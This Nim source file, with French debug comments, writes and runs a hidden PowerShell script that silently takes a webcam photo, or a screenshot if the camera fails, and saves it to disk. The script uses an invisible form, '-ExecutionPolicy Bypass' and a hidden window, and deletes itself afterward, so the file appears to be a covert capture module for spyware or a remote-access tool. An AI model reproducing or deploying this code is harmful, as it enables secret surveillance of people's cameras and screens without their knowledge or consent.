import os

proc captureWebcam(): string =
  let psScript = getTempDir() & "capture.ps1"
  
  let script = """
$output = "$env:TEMP\webcam_temp.jpg"

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Minimized'
$form.ShowInTaskbar = $false
$form.Opacity = 0
$form.FormBorderStyle = 'None'
$form.WindowState = 'Minimized'
$form.Show()

try {
    $wia = New-Object -ComObject WIA.CommonDialog
    $device = $wia.ShowSelectDevice(1)
    if ($device) {
        $img = $device.Transfer()
        $img.SaveFile($output)
    }
} catch {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    $bitmap.Save($output)
}

$form.Close()
Write-Output $output
"""
  
  writeFile(psScript, script)
  
  let cmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" & psScript & "\""
  discard execShellCmd(cmd)
  
  sleep(3000)
  
  let tempFile = getTempDir() & "webcam_temp.jpg"
  var result = ""
  if fileExists(tempFile):
    result = readFile(tempFile)
    # NE PAS SUPPRIMER pour pouvoir voir l'image
    # removeFile(tempFile)
    echo "[DEBUG] Fichier temporaire: ", tempFile
  else:
    echo "[DEBUG] Aucun fichier trouvé"
  
  removeFile(psScript)
  return result

when isMainModule:
  let photo = captureWebcam()
  if photo != "":
    echo "[+] Photo capturée: ", photo.len, " bytes"
    
    # Sauvegarde l'image dans le dossier courant
    writeFile("webcam_image.jpg", photo)
    echo "[+] Image sauvegardée: webcam_image.jpg"
    echo "[+] Ouvre ce fichier pour voir la capture"
  else:
    echo "[-] Aucune photo"